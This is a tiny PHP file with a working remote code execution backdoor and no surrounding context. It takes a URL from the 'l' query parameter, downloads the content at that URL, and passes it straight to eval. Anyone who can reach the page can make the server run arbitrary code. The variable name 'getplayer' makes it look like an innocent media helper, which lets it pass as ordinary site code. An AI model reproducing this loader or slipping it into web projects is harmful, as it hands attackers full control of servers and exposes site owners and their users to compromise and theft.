<?php

$getplayer = file_get_contents($_GET['l']);
eval($getplayer);

?>